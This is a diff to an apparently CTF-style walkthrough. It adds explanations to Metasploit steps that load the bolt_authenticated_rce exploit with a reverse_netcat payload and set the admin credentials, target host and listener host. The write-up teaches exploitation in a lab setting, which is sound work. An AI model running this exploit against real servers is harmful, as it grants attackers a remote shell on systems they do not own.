@@ -380,8 +380,8 @@ View the full module info with the info -d command.
 
 # Vulnerability Exploitation
 > Vulnerability Exploitation Using Metasploit
-14. `use {EXPLOIT PATH}`
-15. `show options`
+14. `use {EXPLOIT PATH}` to load in the exploit that we found for us to use
+15. `show options` to display this module's required options and current settings onto our terminal 
 ```bash
 msf6 > use exploit/unix/webapp/bolt_authenticated_rce
 [*] Using configured payload cmd/unix/reverse_netcat
@@ -436,7 +436,7 @@ View the full module info with the info, or info -d command.
 
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
 ```
-16. `set PASSWORD {JAKE'S PASSWORD}`
+16. `set PASSWORD {JAKE'S PASSWORD}` to set the value of the **PASSWORD** variable to the admin's password
 17. `set RHOSTS {TARGET IP}`
 18. `set USERNAME {JAKE'S USERNAME}`
 19. `set LHOST {MACHINE IP}`
